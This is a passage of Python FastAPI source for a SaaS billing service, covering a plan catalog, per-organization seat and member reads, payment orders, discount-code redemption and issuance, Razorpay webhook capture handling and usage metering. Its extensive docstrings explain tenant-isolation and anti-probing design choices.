#: The collapsed half of SC-4g done-when 4's partition: {unknown, wrong-org}.
#: A distinguishable "wrong org" answer confirms that a code exists and belongs
#: to somebody, which is a membership test over other tenants' data run from a
#: customer's own key.
_NO_SUCH_CODE = "no such discount code"


def _no_such_order() -> HTTPException:
    return HTTPException(status_code=404, detail=_NO_SUCH_ORDER)


def _no_such_code() -> HTTPException:
    return HTTPException(status_code=404, detail=_NO_SUCH_CODE)


@app.get("/billing/catalog")
def billing_catalog(_: CatalogCaller) -> CatalogView:
    """The priced ladder a customer may buy from (§6 item (f)).

    **Two schemes, one route** (:func:`auth.customer_or_operator`). A CUSTOMER
    key reads it on the way to paying us; the OPERATOR token reads it because
    the Operator Console's manual-activation form is a plan picker and a picker
    needs the ladder. Before the operator arm existed that form presented the
    only credential it holds, got the customer door's 401, and rendered an
    empty dropdown over a permanently disabled Activate button.

    **Why ``can_pay`` and not ``can_use_ai``** on the customer arm: this is the
    read a customer makes on the way to paying us, so gating it on the AI door
    would shut it on exactly the ``suspended`` organization who most needs it —
    §9.3(5)'s measured defect, one route along. A ``deleted`` organization is
    refused, like everywhere else.

    **The caller is authenticated and then deliberately unused.** The catalog
    is the same for every customer, so binding it to ``_`` is the structural
    statement that no per-org answer is computable here: there is no
    organization id in scope to compute one from — which is also why the second
    scheme can share this body and could not share ``/me/seats``'. Per-org
    pricing is MT-2 / SC-1a's and neither is built.

    Rupees become paise through ``payments.paise`` — the ONE conversion (§9.2),
    the same call ``_priced_basket`` makes, so what the ladder quotes and what
    an order charges cannot drift into two denominations.
    """
    with get_engine().begin() as conn:
        return CatalogView(plans=[
            CatalogPlanView(
                slug=plan["slug"],
                name=plan["name"],
                kind=plan["kind"],
                price_paise=payments.paise(plan["price_inr"]),
                sort_order=plan["sort_order"],
            )
            for plan in store.active_plans(conn)
        ])


@app.get("/me/seats")
def my_seats(caller: PayingCaller) -> SeatsView:
    """The calling organization's OWN seats, per plan (§6 item (g)).

    The sibling of ``GET /billing/catalog`` and the same move: a customer-key read
    on the ``can_pay`` door. **Why ``can_pay`` and not the Operator door or
    ``KeyCaller``**: a ``suspended`` organization is the one deciding whether to
    buy more seats, so it must be able to SEE them — the §9.3(5) reasoning item
    (f) records one route along — and a ``deleted`` one is refused like
    everywhere else. ``GET /billing/summary`` computes these same numbers but is
    the **Operator**, cross-org door and takes an ``org_slug`` a customer must
    never name; ``GET /me/billing`` carries no seats at all. So the customer's own
    seat grid (``subscription_console.md`` SC-1a) had no data source until this.

    **The organization is a property of the credential** — ``caller.
    organization_id``, never an ``org_slug`` on the wire (R11) — so org A can
    never read org B's seats, by construction rather than by a ``WHERE`` clause a
    reader has to remember, exactly as ``my_billing`` relies on one route up.

    The four counts come from the ONE seat vocabulary: ``store.seat_rows`` folded
    through ``seat_counts`` (§3.3, D32.5), the SAME computation ``billing_summary``
    runs — literally the one shared ``_seat_grid`` loop, with the org id taken from
    the credential instead of ``_org_id(conn, org_slug)``. There is no second SQL
    and no recompute: ``available``'s zero-clamp and ``oversubscribed`` are
    ``seat_counts``'s, surfaced not reimplemented, and the frontend renders them
    verbatim. A plan the org never touched is skipped exactly as
    ``billing_summary`` skips it, not emitted as a zero row.
    """
    with get_engine().begin() as conn:
        return SeatsView(plans=_seat_grid(conn, caller.organization_id))


@app.get("/me/members")
def my_members(caller: PayingCaller) -> MembersView:
    """The calling organization's OWN members: ``email · role · status`` (§6 item (i)).

    The exact sibling of ``GET /me/seats`` and the same move: a customer-key read
    on the ``can_pay`` door, so the manage-seats surface (``subscription_console.md``
    SC-2b) has a roster to pick WHOM to seat. **Why ``can_pay`` and not the
    Operator door or ``KeyCaller``**: a ``suspended`` organization is the one
    deciding whom to seat as it decides whether to pay, so it must be able to SEE
    its members — the §9.3(5) reasoning ``my_seats`` records — and a ``deleted``
    one is refused like everywhere else. No existing customer read returned a
    per-org roster: the membership reads are single-member-by-identity,
    by-email-across-orgs, or an owner ``EXISTS`` — so this is the org's own member
    grid's first data source.

    **The organization is a property of the credential** — ``caller.
    organization_id``, never an ``org_slug`` on the wire (R11) — so org A can
    never read org B's members, by construction rather than by a ``WHERE`` clause a
    reader has to remember, exactly as ``my_seats`` relies on one route up.

    The roster is the ONE membership-list read ``store.org_members`` (the
    established ``org_membership ⋈ user_identity`` join idiom), surfaced verbatim
    into ``MembersView``: there is no second SQL and no per-member recompute. The
    read applies no ``status`` filter — every membership row boards with its
    ``status`` and the surface chooses which to render (``store``'s "fetches rows,
    decides nothing" doctrine).

    **Seats (D49 / LS-7).** The per-member seat summary this read used to defer is
    now carried, as **plan slugs only**, from ONE additional whole-org query
    (``store.live_seats_by_email``) zipped onto the roster in memory. Two queries
    for any roster size, not one per member. A member with no live seat gets
    ``[]`` — *Unassigned* — which is the state the customer's seat surface needs
    in order to offer a reassign, and which no existing read could express. The
    seat COUNTS stay ``GET /me/seats``'s: this read carries membership facts, not
    arithmetic (§3.3, D32.5).

    Both queries run in ONE transaction, so the roster and the seats are a
    consistent snapshot — a seat released between two connections would otherwise
    surface as a member holding a seat that no longer exists, or the reverse.
    """
    with get_engine().begin() as conn:
        rows = store.org_members(conn, org_id=caller.organization_id)
        seats = store.live_seats_by_email(conn, org_id=caller.organization_id)
        return MembersView(members=[
            MemberView(**row, seats=seats.get(row["email"], []))
            for row in rows
        ])


def _order_view(conn, order: dict[str, Any], *, with_lines: bool) -> OrderView:
    """Shape one order for the customer's wire. Provider ids never board it."""
    discount = store.redemption_for_order(conn, order_id=order["id"])
    return OrderView(
        id=order["id"],
        status=order["status"],
        provider=order["provider"],
        gross_paise=order["gross_paise"],
        discount_paise=order["discount_paise"],
        taxable_paise=order["taxable_paise"],
        gst_paise=order["gst_paise"],
        total_paise=order["total_paise"],
        gst_split=order["gst_split"],
        expires_at=order["expires_at"],
        created_at=order["created_at"],
        terminal_at=order["terminal_at"],
        lines=(
            [OrderLineView(**line) for line in _lines_for(conn, order["id"])]
            if with_lines else None
        ),
        discount=(
            OrderDiscountView(
                code_prefix=discount["code_prefix"],
                discount_paise=discount["discount_paise"],
            ) if discount else None
        ),
    )


def _lines_for(conn, order_id: str) -> list[dict[str, Any]]:
    return [
        {"plan_slug": line["plan_slug"], "quantity": line["quantity"],
         "unit_price_paise": line["unit_price_paise"]}
        for line in store.order_lines(conn, order_id=order_id)
    ]


def _priced_basket(conn, lines: list[OrderLineRequest]) -> tuple[list, int]:
    """Price a basket from the CATALOG. 400 for anything it will not sell.

    An order line whose ``plan_slug`` is not an **active** catalog row is
    refused, so the checkout cannot sell a thing the catalog does not price
    (§9.1) — `rnd` and `support` are seeded INACTIVE precisely because their
    Centers are not registered yet.
    """
    priced: list[dict[str, Any]] = []
    gross = 0
    for line in lines:
        plan = store.priced_plan(conn, plan_slug=line.plan_slug)
        if plan is None:
            raise HTTPException(
                status_code=400,
                detail=(
                    f"{line.plan_slug!r} is not an active plan; the checkout "
                    "sells only priced, active catalog rows"
                ),
            )
        unit = payments.paise(plan["price_inr"])
        gross += unit * line.quantity
        priced.append({
            "plan_slug": plan["slug"], "quantity": line.quantity,
            "unit_price_paise": unit,
        })
    return priced, gross


@app.post("/billing/orders")
def create_order(req: CreateOrderRequest, caller: PayingCaller) -> OrderView:
    """Create a pending intent under the CUSTOMER's own key (§9.3(2)).

    **It writes ``payment_order`` and ``payment_order_line`` and nothing else.**
    No entitlement, no seat, no ledger row, no subscription change — which is
    what makes a customer-authenticated write safe on a service whose customer
    credential is read-only by design (CP-3's lesson). Done-when 3 asserts it
    by snapshotting all four tables around this call.

    Gated on ``can_pay``, not ``can_use_ai``: a **suspended** organization must
    be able to buy its way out, and `auth.organization_from_key` shuts the door
    on exactly that customer (§9.3(5)).

    With no Razorpay credentials this is **503 naming the missing variables**
    (done-when 10). Refusing early is honest — an order nobody could ever pay
    is not an order — and it is half of how CP-9 ships dark, the other half
    being ``purchaseEnabled: False`` on the surface the workbench renders.

    ⚠️ **The provider order is created HERE, for the amount owed at this
    moment**, and any later redemption that changes the amount replaces it
    (see :func:`redeem_discount_code`). A provider order created once and then
    discounted would collect the pre-discount amount — the customer would be
    overcharged and the capture would fail our own amount check.
    """
    try:
        provider = payments.provider()
    except payments.ProviderUnconfigured as exc:
        raise HTTPException(status_code=503, detail=str(exc)) from None

    org_id = caller.organization_id
    with get_engine().begin() as conn:
        priced, gross = _priced_basket(conn, req.lines)
        billing = conn.execute(
            text("SELECT gstin, billing_state FROM organization WHERE id = :i"),
            {"i": org_id},
        ).first()
        gst_split = payments.gst_split_for(billing[1] if billing else None)
        gst = payments.gst_for(gross)
        total = gross + gst
        if total == 0:
            # An order that collects nothing is not a purchase. The Rs 0 path
            # is reached by REDEEMING a code against a priced order, never by
            # ordering only free rows (`company` is Rs 0 and is not sold).
            raise HTTPException(
                status_code=400,
                detail="an order with nothing to pay is not a purchase",
            )

        order_id = store.create_order(
            conn, org_id=org_id, provider="razorpay",
            gross_paise=gross, discount_paise=0, taxable_paise=gross,
            gst_paise=gst, total_paise=total, gst_split=gst_split,
            customer_gstin=billing[0] if billing else None,
            place_of_supply=billing[1] if billing else None,
            expires_in_minutes=_ORDER_TTL_MINUTES, lines=priced,
        )
        # Inside the transaction on purpose: if the provider refuses, the local
        # order rolls back with it. The orphan this can leave is the harmless
        # direction — a provider order nobody pays, which expires there — and
        # never the dangerous one, a local order the customer cannot pay.
        created = provider.create_order(
            amount_paise=total, receipt=order_id,
            notes={"organization_id": org_id},
        )
        store.set_provider_order_id(
            conn, order_id=order_id,
            provider_order_id=created.provider_order_id,
        )
        _audit(conn, org_id, "order.create",
               {"order_id": order_id, "total_paise": total,
                "lines": [line["plan_slug"] for line in priced]},
               actor="organization")
        order = store.order_for_update(conn, order_id=order_id, org_id=org_id)
        assert order is not None
        return _order_view(conn, order, with_lines=True)


@app.get("/billing/orders/{order_id}")
def read_order(order_id: str, caller: PayingCaller) -> OrderView:
    """One order — **own org only** (§9.3a, §9.3(7)'s predicate).

    The organization comes from the key's resolution, never from the path, the
    body or a header (R11). A foreign order and an unknown one answer one
    byte-identical 404.
    """
    with get_engine().begin() as conn:
        order = store.order_row(
            conn, order_id=_valid_uuid(order_id),
            org_id=caller.organization_id,
        )
        if order is None:
            raise _no_such_order()
        return _order_view(conn, order, with_lines=True)


@app.get("/billing/orders")
def list_orders(
    caller: PayingCaller, status: str | None = None, cursor: str | None = None,
) -> OrderPageView:
    """That organization's orders, newest first (§9.3a).

    ``status`` is validated against the state machine's own set — an unknown
    value is **400, not silently ignored**, because a filter that quietly
    matches everything reads as "there are no failed orders".
    """
    if status is not None and status not in payments.ORDER_STATES:
        raise HTTPException(
            status_code=400,
            detail=f"unknown status {status!r}; "
                   f"expected one of {sorted(payments.ORDER_STATES)}",
        )
    with get_engine().begin() as conn:
        rows = store.orders_page(
            conn, org_id=caller.organization_id, limit=_ORDER_PAGE_SIZE,
            status=status,
            cursor=_valid_uuid(cursor) if cursor else None,
        )
        return OrderPageView(
            orders=[_order_view(conn, r, with_lines=False) for r in rows],
            next=rows[-1]["id"] if len(rows) == _ORDER_PAGE_SIZE else None,
        )


def _valid_uuid(value: str) -> str:
    """A malformed id is *"no such order"*, never a 500 from the driver.

    Postgres rejects a non-UUID literal for a UUID column with an error the
    driver raises, which would surface as a 500 and — worse — would tell a
    prober that "malformed" and "not yours" are different answers.
    """
    try:
        return str(uuid.UUID(value))
    except (ValueError, AttributeError, TypeError):
        raise _no_such_order() from None


@app.post("/billing/orders/{order_id}/redeem")
def redeem_discount_code(
    order_id: str, req: RedeemRequest, caller: PayingCaller,
) -> OrderView:
    """Present a discount code against one's own order (SC-4g, §9.3(2)).

    **This route grants — and it is the only org-key route that may.** It is
    the one allow-listed edge in
    ``test_no_org_key_route_writes_an_entitlement_or_ledger_row``, written as
    the PAIR ``("redeem_discount_code", "payments.fulfil")`` rather than as a
    sentence like *"redeem may write seats"*: a sentence is a general licence,
    a pair is not. What makes it safe is that **the code is the
    pre-authorization** — the customer cannot mint one; somebody holding
    ``Operator`` issued it. The org key still cannot move value on its own
    authority.

    The refusals PARTITION (done-when 4):

    * ``expired`` / ``revoked`` / ``exhausted`` — three DISTINCT reasons, given
      only for a code this organization is entitled to see at all. The caller
      has already proven possession of the secret, so naming *why* it failed
      tells them nothing they could not learn by asking us — and an admin told
      "this code expired on the 3rd" does not file a support ticket.
    * ``unknown`` / ``wrong-org`` — ONE indistinguishable shape, because a
      distinguishable "wrong org" confirms a code exists and belongs to
      somebody: a membership test over other tenants' data, run from a
      customer's own key.

    Idempotent: re-presenting the same code against the same order redeems once
    (``UNIQUE (discount_code_id, order_id)``), and a concurrent double-redeem of
    a ``max_redemptions = 1`` code yields one success and one refusal under
    ``store.lock_discount_capacity``.
    """
    org_id = caller.organization_id
    order_id = _valid_uuid(order_id)

    # Expiry runs in its OWN transaction, ahead of the work: a refusal below
    # rolls its transaction back, and an `abandoned` written in that
    # transaction would roll back with it — leaving an order that reports
    # itself open forever while refusing every attempt.
    with get_engine().begin() as conn:
        stale = store.order_for_update(conn, order_id=order_id, org_id=org_id)
        if stale is not None:
            payments.abandon_if_expired(conn, order=stale)

    parsed = split_key(req.code.strip())

    with get_engine().begin() as conn:
        order = store.order_for_update(conn, order_id=order_id, org_id=org_id)
        if order is None:
            raise _no_such_order()
        if order["status"] in payments.ORDER_TERMINAL_STATES:
            # Not one of the five: this is a statement about the ORDER, not
            # about the code. Naming it separately is what lets a page say
            # "this order has expired, start again" rather than "bad code".
            raise HTTPException(
                status_code=409,
                detail={"reason": "order_not_open", "status": order["status"]},
            )

        # ⚠️ **Above the verification, never below it** (moved 2026-08-19,
        # review P2-1). `_verified_code` raises on all four refusal shapes, so
        # below it this line recorded only the attempts that SUCCEEDED — the
        # measured rate its docstring promises was zero under exactly the
        # traffic a rate limiter would be sized against.
        _log_redeem_attempt(order_id, parsed)
        code = _verified_code(conn, parsed=parsed, org_id=org_id)

        # BEFORE the count, never between the count and the insert — the seat
        # cap's lesson, one table along (`store.lock_seat_capacity`).
        store.lock_discount_capacity(conn, code_id=code["id"])

        existing = store.redemption_for_order(conn, order_id=order_id)
        if existing is not None:
            if existing["code_prefix"] != code["prefix"]:
                # Stacking discounts is a commercial decision nobody has taken,
                # so it is refused rather than invented here.
                raise HTTPException(
                    status_code=409,
                    detail={"reason": "already_discounted"},
                )
            return _order_view(conn, order, with_lines=True)

        if code["expired"]:
            raise HTTPException(409, detail={"reason": "expired"})
        if code["revoked"]:
            raise HTTPException(409, detail={"reason": "revoked"})
        if store.count_redemptions(conn, code_id=code["id"]) >= code[
                "max_redemptions"]:
            raise HTTPException(409, detail={"reason": "exhausted"})

        return _apply_redemption(conn, order=order, code=code, org_id=org_id)


def _verified_code(conn, *, parsed, org_id: str) -> dict[str, Any]:
    """Resolve a presented code, or raise the ONE collapsed refusal.

    Three cases collapse into one shape here — malformed, unknown prefix, wrong
    secret — plus the fourth, a code bound to a different organization. What
    the caller learns is identical in all four: nothing.
    """
    if parsed is None or not is_discount_code(parsed[0]):
        raise _no_such_code()
    prefix, secret = parsed
    code = store.resolve_discount_code(conn, prefix=prefix)
    if code is None:
        # Verify against a dummy hash so both paths do the same work — the
        # idiom `organization_from_key` uses, and with the same caveat: it is
        # cheap defence in depth, not a proven constant-time property.
        verify_secret(secret, "0" * 64)
        raise _no_such_code()
    if not verify_secret(secret, code["code_hash"]):
        raise _no_such_code()
    if code["organization_id"] not in (None, org_id):
        raise _no_such_code()
    return code


def _log_redeem_attempt(order_id: str, parsed) -> None:
    """Log the PREFIX only — never the secret (done-when 17).

    Rate limiting on redemption is deliberately deferred (9.3(6)): a redeem
    attempt is a guess at a 256-bit bearer secret answered by an
    indistinguishable refusal, so it is neither an oracle nor a feasible
    search. What would change that call is a MEASURED attempt rate, which is
    exactly what this line is for.

    ⚠️ **Therefore it must run BEFORE the code is verified**, and it did not
    until 2026-08-19: every failing attempt — malformed, unknown prefix, wrong
    secret, wrong organization — raised out of :func:`_verified_code` first, so
    the only attempts counted were the ones that worked. Fence:
    ``test_a_failing_redeem_attempt_is_logged_and_carries_no_secret``.
    """
    _log.info(
        "payments.redeem_attempt",
        extra={"order": order_id, "code_prefix": parsed[0] if parsed else None},
    )


def _apply_redemption(
    conn, *, order: dict[str, Any], code: dict[str, Any], org_id: str,
) -> OrderView:
    """Recompute the order's money, record the redemption, and — at zero — grant.

    GST is recomputed on the DISCOUNTED base (SC-4g (iii)): that is standard
    invoice practice and the only reading under which 100 percent off yields
    taxable 0 -> GST 0 -> total 0, which is what D42 requires. Discount after
    tax would leave GST payable on a zero-rupee sale.
    """
    discount = payments.discount_for(
        gross_paise=order["gross_paise"], kind=code["kind"],
        percent_bp=code["percent_bp"], amount_paise=code["amount_paise"],
    )
    taxable = order["gross_paise"] - discount
    gst = payments.gst_for(taxable)
    total = taxable + gst

    redemption_id = store.write_redemption(
        conn, code_id=code["id"], org_id=org_id, order_id=order["id"],
        gross_paise=order["gross_paise"], discount_paise=discount,
        net_paise=total,
    )
    if redemption_id is None:
        # Lost a race with an identical submission; the winner's row stands and
        # this call is the idempotent no-op done-when 5 requires.
        return _order_view(conn, order, with_lines=True)

    store.apply_discount_to_order(
        conn, order_id=order["id"], discount_paise=discount,
        taxable_paise=taxable, gst_paise=gst, total_paise=total,
    )
    _audit(conn, org_id, "discount.redeem",
           {"order_id": order["id"], "code_prefix": code["prefix"],
            "discount_paise": discount, "net_paise": total},
           actor="organization")

    if total == 0:
        # The Rs 0 path: `provider='none'`, no provider identifier, and ZERO
        # provider calls in this request. The order created earlier left an
        # unpaid provider order behind, which expires there — the harmless
        # orphan, named rather than discovered (SC-4g (iv)).
        store.detach_provider(conn, order_id=order["id"])
        payments.fulfil(
            conn, order_id=order["id"],
            reference=f"redemption:{redemption_id}",
        )
    else:
        # A PARTIAL code routes the remainder through the provider path — one
        # order, discount recorded, fulfilment on capture, no second flow. The
        # provider order is REPLACED because its amount is now wrong, and a
        # provider order that collects the pre-discount amount is a customer
        # overcharged by us.
        _replace_provider_order(conn, order_id=order["id"], total_paise=total,
                                org_id=org_id)

    fresh = store.order_row(conn, order_id=order["id"], org_id=org_id)
    assert fresh is not None
    return _order_view(conn, fresh, with_lines=True)


def _replace_provider_order(
    conn, *, order_id: str, total_paise: int, org_id: str
) -> None:
    """Re-create the provider order for the discounted amount."""
    try:
        provider = payments.provider()
    except payments.ProviderUnconfigured as exc:
        raise HTTPException(status_code=503, detail=str(exc)) from None
    created = provider.create_order(
        amount_paise=total_paise, receipt=order_id,
        notes={"organization_id": org_id},
    )
    store.set_provider_order_id(
        conn, order_id=order_id, provider_order_id=created.provider_order_id,
    )


@app.post("/billing/webhooks/razorpay")
def razorpay_webhook(event: SignedWebhook) -> dict[str, Any]:
    """Capture, verified first and idempotent second (§9.5).

    The signature check is not in this body — it is
    :func:`auth.razorpay_webhook_event`, an **authenticating dependency**, so
    the route is covered by the same fence that covers every other door on this
    service and a refactor cannot quietly drop it.

    **Two guards, and they are NOT the same guard:**

    1. ``payment_event.provider_event_id`` (PRIMARY KEY) is **transport**
       dedup. It makes the same delivery, delivered twice, a no-op. That is the
       retry case and nothing more.
    2. The **terminal-state rule** is the **money** guard. Razorpay sends
       DIFFERENT event ids for one capture (``payment.captured`` and
       ``order.paid``), so the primary key never sees them as duplicates. What
       makes the second harmless is that ``captured`` is terminal:
       :func:`payments.fulfil` refuses, this route logs at info and answers
       200. Both events are recorded; exactly one fulfils.

       ⚠️ **That no-op is scoped to `captured` and to nothing else** (repaired
       2026-08-19). A refusal against any *other* terminal state means a
       verified payment arrived and nothing was granted — an ERROR, not an
       info line; see :func:`_handle_webhook_event`.

    **A failed payment ATTEMPT does not close the ORDER.** One provider order
    accepts many attempts until one captures, so ``payment.failed`` is recorded
    and logged and the order stays open for the retry. Order-level failure is
    ``abandoned``, written by the clock (§9.2).

    A capture whose amount disagrees with ``total_paise`` is **refused and
    alerted**, never fulfilled: an amount mismatch is a bug or an attack, and
    it must not be resolved in the customer's favour silently. The refusal
    rolls its own receipt back deliberately, so a corrected re-delivery is
    evaluated afresh instead of being deduped into silence.
    """
    with get_engine().begin() as conn:
        order = (
            store.order_by_provider_id(
                conn, provider_order_id=event.provider_order_id)
            if event.provider_order_id else None
        )
        fresh = store.record_payment_event(
            conn, provider_event_id=event.event_id,
            order_id=order["id"] if order else None,
            kind=event.kind, body=json.dumps(event.body),
        )
        if not fresh:
            _log.info("payments.webhook_duplicate",
                      extra={"event": event.event_id})
            return {"recorded": False, "fulfilled": False}
        if order is None:
            # Recorded, not acted on, and 200 so the provider stops retrying a
            # delivery we will never be able to resolve.
            #
            # ⚠️ **ERROR, not warning** (2026-08-18, verification finding F2).
            # This arm is not only the benign "an event we never issued an
            # order for" case. A `payment.captured` whose `order_id` matches no
            # row here is **a customer charged with nothing granted** — and our
            # 200 is precisely what makes the provider stop retrying it. The
            # receipt row is kept with `order_id` NULL as the sole record that
            # the money arrived, and CP-8's reconciliation OWNS those rows.
            # The amount and both provider identifiers ride in the structured
            # fields so the payment can be found at the provider from the log
            # line alone. Fenced by
            # `test_a_capture_with_no_matching_order_is_kept_and_alerted_at_error`.
            _log.error(
                "payments.webhook_unknown_order",
                extra={"event": event.event_id, "event_kind": event.kind,
                       "provider_order_id": event.provider_order_id,
                       "provider_payment_id": event.provider_payment_id,
                       "amount_paise": event.amount_paise},
            )
            return {"recorded": True, "fulfilled": False}

        return _handle_webhook_event(conn, event=event, order=order)


def _handle_webhook_event(
    conn, *, event: payments.WebhookEvent, order: dict[str, Any]
) -> dict[str, Any]:
    """Decide what one verified, freshly recorded event does to its order."""
    if event.kind in _ATTEMPT_FAILURE_EVENTS:
        # ⚠️ **A failed ATTEMPT is not a failed ORDER** (repaired 2026-08-19,
        # review P0). One Razorpay order accepts MANY payment attempts until
        # one captures: a UPI collect that times out, a card the issuer
        # declines, a 3DS step the customer abandons. This arm used to
        # transition the order to `failed` — TERMINAL, no edge leaves it — so
        # the retry the customer made inside the same Checkout arrived at a
        # dead order, `fulfil` refused, and the money-received-nothing-granted
        # path opened with a 200 that stopped the provider retrying.
        #
        # The order stays OPEN until it is captured or the TTL abandons it.
        # Order-level failure is 9.2's `abandoned`, written by the clock. The
        # receipt is what makes the attempt visible — SC-4a's "a failed payment
        # says so" reads `payment_event`, not a closed order.
        _log.info(
            "payments.attempt_failed",
            extra={"order": order["id"], "event": event.event_id,
                   "event_kind": event.kind, "status": order["status"],
                   "provider_payment_id": event.provider_payment_id},
        )
        return {"recorded": True, "fulfilled": False}

    if event.kind not in _CAPTURE_EVENTS:
        # Recorded and ignored. Razorpay sends many event types; acting on one
        # we have not designed for is how a refund becomes a grant.
        return {"recorded": True, "fulfilled": False}

    if event.amount_paise != order["total_paise"]:
        # THE alert. Refused, never fulfilled, and never resolved in the
        # customer's favour: 409 rather than 200, so the provider's retries
        # keep the discrepancy visible instead of letting one silent 200 close
        # the incident.
        _log.error(
            "payments.amount_mismatch",
            extra={"order": order["id"], "event": event.event_id,
                   "expected_paise": order["total_paise"],
                   "presented_paise": event.amount_paise},
        )
        raise HTTPException(
            status_code=409,
            detail="captured amount does not match the order total",
        )

    try:
        payments.fulfil(
            conn, order_id=order["id"], reference=f"order:{order['id']}",
        )
    except TransitionRefused:
        # ⚠️ **TWO situations reach this arm and only ONE of them is benign**
        # (split 2026-08-19, review P0(b)). Branching on the order's status is
        # what tells them apart:
        if order["status"] == "captured":
            # The SECOND event of one capture (`payment.captured` and
            # `order.paid` carry different ids). Recorded, not fulfilled,
            # 200 — the money guard doing exactly its job.
            _log.info("payments.already_fulfilled",
                      extra={"order": order["id"], "event": event.event_id})
            return {"recorded": True, "fulfilled": False}
        # Any OTHER terminal state — `abandoned` today, reachable the moment a
        # capture lands after the TTL sweep ran — means a signature-verified
        # payment of the right amount arrived and we granted nothing. Same
        # class as `payments.webhook_unknown_order`, so the same severity and
        # the same three structured fields: the payment must be findable at the
        # provider from the log line alone. CP-8's reconciliation owns these
        # rows alongside the NULL-`order_id` receipts.
        _log.error(
            "payments.capture_after_terminal",
            extra={"order": order["id"], "event": event.event_id,
                   "status": order["status"],
                   "provider_order_id": event.provider_order_id,
                   "provider_payment_id": event.provider_payment_id,
                   "amount_paise": event.amount_paise},
        )
        return {"recorded": True, "fulfilled": False}
    return {"recorded": True, "fulfilled": True}


#: Event kinds that mean money arrived. TWO of them, for ONE payment — which is
#: why the terminal-state rule exists (§9.5, B8).
_CAPTURE_EVENTS = frozenset({"payment.captured", "order.paid"})

#: Event kinds that mean **one attempt** failed. ⚠️ Named `_ATTEMPT_` on
#: purpose: they say nothing about the ORDER, which stays open for the next
#: attempt. **Nothing in the tree drives an order to `failed`** — the state
#: stays on 9.2's graph for an explicit customer cancel the surface half may
#: add, and order-level failure today is `abandoned`, written by the clock.
_ATTEMPT_FAILURE_EVENTS = frozenset({"payment.failed"})


@app.post("/discounts")
def issue_discount(req: IssueDiscountRequest, _: Operator) -> dict[str, Any]:
    """Mint a discount code. **The token is returned exactly once** (SC-4g (i)).

    Only the hash is stored, so this response is the only moment the secret
    exists anywhere — the same property `POST /keys` has, and for the same
    reason: a recoverable discount code is a shared password in a database
    somebody exports. A code that must be re-read later is re-issued.

    🔴 Issuing a code against a **live** organization is OWNER-GATE
    (`work_plan.md` §6(g), the SC-4e adjustment gate class). Authoring codes
    against fixtures is agent-safe; this route is the API beneath the operator
    surface CP-8 will render.
    """
    if req.kind not in ("percent", "fixed"):
        raise HTTPException(status_code=400,
                            detail="kind must be 'percent' or 'fixed'")
    if (req.kind == "percent") != (req.percent_bp is not None):
        raise HTTPException(
            status_code=400,
            detail="a percent code needs percent_bp and nothing else")
    if (req.kind == "fixed") != (req.amount_paise is not None):
        raise HTTPException(
            status_code=400,
            detail="a fixed code needs amount_paise and nothing else")

    minted = mint_key(env=ENV_DISCOUNT)
    with get_engine().begin() as conn:
        org_id = _org_id(conn, req.org_slug) if req.org_slug else None
        store.issue_discount_code(
            conn, prefix=minted.prefix, code_hash=minted.key_hash,
            label=req.label, kind=req.kind, org_id=org_id,
            percent_bp=req.percent_bp, amount_paise=req.amount_paise,
            max_redemptions=req.max_redemptions, expires_at=req.expires_at,
            created_by="operator",
        )
        # The audit row records the PREFIX, never the token.
        _audit(conn, org_id, "discount.issue",
               {"prefix": minted.prefix, "label": req.label,
                "kind": req.kind, "max_redemptions": req.max_redemptions})

    return {"prefix": minted.prefix, "code": minted.token}


@app.post("/usage/record")
def record_usage(req: UsageRequest, _: Internal) -> dict[str, Any]:
    """Record one metered call. Idempotent on ``(organization_id, request_id)``.

    **Internal token only.** This endpoint briefly accepted the customer's own
    organization key, which was wrong twice over: it let a negative
    ``billed_credits`` mint credits, and more fundamentally it made the metered
    party the reporter of its own usage — the thing §4.1 says is "not a meter,
    it is a suggestion". The Router counts the tokens it proxied and writes this
    row; the customer's key is read-only (:func:`whoami`).

    Idempotency is scoped **per organization** (migration 003). Globally-unique
    request ids let one tenant's id silently suppress another's charge and
    turned ``recorded:false`` into a cross-tenant existence oracle.

    Returns ``recorded: false`` for a replay. Callers should treat that as
    success, not as an error to retry, or a reconnect storm becomes a retry
    storm.
    """
    org_id = req.organization_id
    with get_engine().begin() as conn:
        recorded = store.record_usage(
            conn,
            org_id=org_id,
            request_id=req.request_id,
            billed_credits=req.billed_credits,
            user_email=req.user_email,
            agent=req.agent,
            module_slug=req.module_slug,
            model=req.model,
            tier=req.tier,
            run_id=req.run_id,
            prompt_tokens=req.prompt_tokens,
            completion_tokens=req.completion_tokens,
            cached_tokens=req.cached_tokens,
        )
        balance = balance_of(store.credit_deltas(conn, org_id=org_id))

    return {"recorded": recorded, "balance": str(balance)}
